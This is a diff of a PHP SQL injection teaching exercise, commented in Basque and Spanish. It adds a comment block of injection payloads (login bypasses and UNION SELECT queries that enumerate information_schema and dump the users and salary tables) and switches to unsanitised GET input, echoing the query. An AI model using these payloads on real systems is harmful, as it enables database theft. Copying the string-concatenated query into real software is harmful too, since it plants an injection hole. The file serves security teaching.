@@ -3,9 +3,18 @@
 /*
 sql injection:
 
-pasahitzaren inputean:
 ' OR '1'='1
 ' OR 1=1--'
+
+https://portswigger.net/web-security/sql-injection/examining-the-database
+https://portswigger.net/web-security/sql-injection/union-attacks
+
+' UNION SELECT @@version, null, null; #'
+' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables; #'
+' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables where TABLE_SCHEMA='sql_injection'; #'
+' UNION SELECT table_name, column_name, null FROM information_schema.columns where TABLE_SCHEMA='sql_injection'; #'
+' UNION select * from users; #'
+' OR '1'='1' UNION select *, null from salary; #'
 */
 
 $servername = "localhost";
@@ -25,17 +34,19 @@ if ($conn->connect_error) {
 
 // formulariotik bidalitako datuak irakurri
 // leer desde el formulario
-$user =  $_POST['user'];
+$user =  $_GET['user'];
 
 //
 $sql = "SELECT * FROM users WHERE user = '$user'";
-//echo $sql . "<br>";
+echo $sql . "<br>";
+
 $result = $conn->query($sql);
 
 if ($result->num_rows > 0) {
-    // output data of each row
     while($row = $result->fetch_assoc()) {
-        echo "erabiltzailea: " . $row["user"]. " / " . $row["pass"]. "<br>";
+        print_r($row);
+        //echo "Erabiltzailea: " . $row["user"] . " // admin da?: " . $row["admin"];
+        echo "<br>";
     }
 } else {
     echo "0 results";
